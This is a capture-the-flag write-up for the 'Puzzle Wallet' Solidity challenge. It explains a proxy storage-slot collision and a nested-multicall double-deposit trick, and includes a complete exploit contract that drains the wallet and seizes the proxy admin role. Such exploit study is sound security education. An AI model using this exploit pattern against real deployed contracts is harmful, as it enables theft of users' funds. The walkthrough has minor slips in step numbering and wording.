# Puzzle Wallet

## Challenge Description

Nowadays, paying for DeFi operations is impossible, fact.

A group of friends discovered how to slightly decrease the cost of performing multiple transactions by batching them in one transaction, so they developed a smart contract for doing this.

They needed this contract to be upgradeable in case the code contained a bug, and they also wanted to prevent people from outside the group from using it. To do so, they voted and assigned two people with special roles in the system: The admin, which has the power of updating the logic of the smart contract. The owner, which controls the whitelist of addresses allowed to use the contract. The contracts were deployed, and the group was whitelisted. Everyone cheered for their accomplishments against evil miners.

Little did they know, their lunch money was at risk…

 You'll need to hijack this wallet to become the admin of the proxy.

 Things that might help:

- Understanding how `delegatecall` works and how `msg.sender` and `msg.value` behaves when performing one.
- Knowing about proxy patterns and the way they handle storage variables.

## Challenge Code

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
pragma experimental ABIEncoderV2;

import "./utils/UpgradeableProxy.sol";

contract PuzzleProxy is UpgradeableProxy {
    address public pendingAdmin;
    address public admin;

    constructor(
        address _admin,
        address _implementation,
        bytes memory _initData
    ) UpgradeableProxy(_implementation, _initData) {
        admin = _admin;
    }

    modifier onlyAdmin() {
        require(msg.sender == admin, "Caller is not the admin");
        _;
    }

    function proposeNewAdmin(address _newAdmin) external {
        pendingAdmin = _newAdmin;
    }

    function approveNewAdmin(address _expectedAdmin) external onlyAdmin {
        require(
            pendingAdmin == _expectedAdmin,
            "Expected new admin by the current admin is not the pending admin"
        );
        admin = pendingAdmin;
    }

    function upgradeTo(address _newImplementation) external onlyAdmin {
        _upgradeTo(_newImplementation);
    }
}

contract PuzzleWallet {
    address public owner;
    uint256 public maxBalance;
    mapping(address => bool) public whitelisted;
    mapping(address => uint256) public balances;

    function init(uint256 _maxBalance) public {
        require(maxBalance == 0, "Already initialized");
        maxBalance = _maxBalance;
        owner = msg.sender;
    }

    modifier onlyWhitelisted() {
        require(whitelisted[msg.sender], "Not whitelisted");
        _;
    }

    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
        require(address(this).balance == 0, "Contract balance is not 0");
        maxBalance = _maxBalance;
    }

    function addToWhitelist(address addr) external {
        require(msg.sender == owner, "Not the owner");
        whitelisted[addr] = true;
    }

    function deposit() external payable onlyWhitelisted {
        require(address(this).balance <= maxBalance, "Max balance reached");
        balances[msg.sender] += msg.value;
    }

    function execute(
        address to,
        uint256 value,
        bytes calldata data
    ) external payable onlyWhitelisted {
        require(balances[msg.sender] >= value, "Insufficient balance");
        balances[msg.sender] -= value;
        (bool success, ) = to.call{value: value}(data);
        require(success, "Execution failed");
    }

    function multicall(bytes[] calldata data) external payable onlyWhitelisted {
        bool depositCalled = false;
        for (uint256 i = 0; i < data.length; i++) {
            bytes memory _data = data[i];
            bytes4 selector;
            assembly {
                selector := mload(add(_data, 32))
            }
            if (selector == this.deposit.selector) {
                require(!depositCalled, "Deposit can only be called once");
                depositCalled = true;
            }
            (bool success, ) = address(this).delegatecall(data[i]);
            require(success, "Error while delegating call");
        }
    }
}

```

## Challenge Solution Walkthrough

To gain ownership of the `PuzzleProxy` contract and become the admin, follow these steps:

1. Understand the relationship between the `PuzzleProxy` and `PuzzleWallet` contracts. The `PuzzleProxy` serves as the proxy contract, which forwards calls to the `PuzzleWallet` contract using `delegatecall()`. Both contracts share the same storage layout.
2. Analyze the storage layout of each contract:

| Slot Number |  Puzzle Proxy  | Puzzle Wallet |
| :---------: | :------------: | :-----------: |
|      0      | `pendingAdmin` |    `owner`    |
|      1      |    `admin`     | `maxBalance`  |
|      2      |                | `whitelisted` |
|      3      |                |  `balances`   |

2. Note that `pendingAdmin` and `owner` are stored in the same slot.

3. Understand the functions that can change the `admin`:

   - The `constructor` sets the initial `admin` value and cannot be used to change it.

   - The `approveNewAdmin()` function allows changing the `admin` but requires the caller to be the current `admin`.

   - No other function exists to change the `admin` directly.

4. Identify that changing the `maxBalance` of the `PuzzleWallet` will indirectly change the `admin` because both values share the same storage slot.

5. Explore the functions that can change the `maxBalance`:

   - The `init()` function sets the initial `maxBalance` but can only be called when the current `maxBalance` is zero.

   - The `setMaxBalance()` function allows changing the `maxBalance` when the contract balance is zero.

6. Note that the `execute()` function can decrease the contract balance but requires a prior deposit.

7. Identify the restriction that the `deposit()` function can only be called once per account.

8. Formulate an exploit strategy to change the `maxBalance` and, consequently, the `admin`:

   - Call the `deposit()` function twice using a `multicall()`, with the value set to 0.001 ether for each call.

   - Use the `multicall()` function to call two functions: 1) `deposit()`, and 2) `multicall()` itself (nested call).

   - By depositing a total of 0.002 ether and tricking the contract into believing that 0.002 ether has been deposited, the contract balance and `balances` mapping will reflect this value.

   - Withdraw all the funds from the contract to set the balance to zero.

   - Change the `maxBalance` to your desired value to indirectly change the `admin`.

9. Implement the `PuzzleWalletSolution` contract to automate the exploit process:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
pragma experimental ABIEncoderV2;

import "./PuzzleWallet.sol";

contract PuzzleWalletSolution {
    PuzzleProxy public puzzleProxy;
    PuzzleWallet public puzzleWallet;

    constructor(address puzzle) {
        puzzleProxy = PuzzleProxy(payable(puzzle));
        puzzleWallet = PuzzleWallet(puzzle);
    }

    function solveChallenge() public payable {
        puzzleProxy.proposeNewAdmin(address(this));
        puzzleWallet.addToWhitelist(address(this));

        bytes[] memory depositSelector = new bytes[](1);
        depositSelector[0] = abi.encodeWithSelector(
            puzzleWallet.deposit.selector
        );
        bytes[] memory functionCalls = new bytes[](2);
        functionCalls[0] = abi.encodeWithSelector(
            puzzleWallet.deposit.selector
        );
        functionCalls[1] = abi.encodeWithSelector(
            puzzleWallet.multicall.selector,
            depositSelector
        );

        uint256 targetBalance = msg.value;

        puzzleWallet.multicall{value: targetBalance}(functionCalls);
        puzzleWallet.execute(msg.sender, 2 * targetBalance, "");
        puzzleWallet.setMaxBalance(uint256(uint160(msg.sender)));
    }
}
```

10. Using this contract, you can execute the `solveChallenge()` function to exploit the vulnerability. The steps executed by this contract include:

    - Changing the `pendingAdmin` of the `PuzzleProxy` to the address of the `PuzzleWalletSolution` contract, making it the pending admin.

    - Adding the `PuzzleWalletSolution` contract to the `whitelisted` addresses to enable calling `multicall()`, `deposit()`, and `execute()` functions.

    - Preparing the call to `deposit()` and `multicall()` functions using a `multicall()` within a `multicall()`, with a value of 0.001 ether.

    - Draining all funds from the `PuzzleWallet` contract by calling `execute()` with a value of 2 * target balance.

    - Setting the `maxBalance` to your address, indirectly changing the `admin` to your address.

By following these steps, you can successfully gain ownership of the `PuzzleProxy` contract and become the admin.

## Challenge Description After Solving

Next time, those friends will request an audit before depositing any money on a contract. Congrats!

Frequently, using proxy contracts is highly recommended to bring upgradeability features and reduce the deployment's gas cost. However, developers must be careful not to introduce storage collisions, as seen in this level.

Furthermore, iterating over operations that consume ETH can lead to issues if it is not handled correctly. Even if ETH is spent, `msg.value` will remain the same, so the developer must manually keep track of the actual remaining amount on each iteration. This can also lead to issues when using a multi-call pattern, as performing multiple `delegatecall`s to a function that looks safe on its own could lead to unwanted transfers of ETH, as `delegatecall`s keep the original `msg.value` sent to the contract.

Move on to the next level when you're ready!
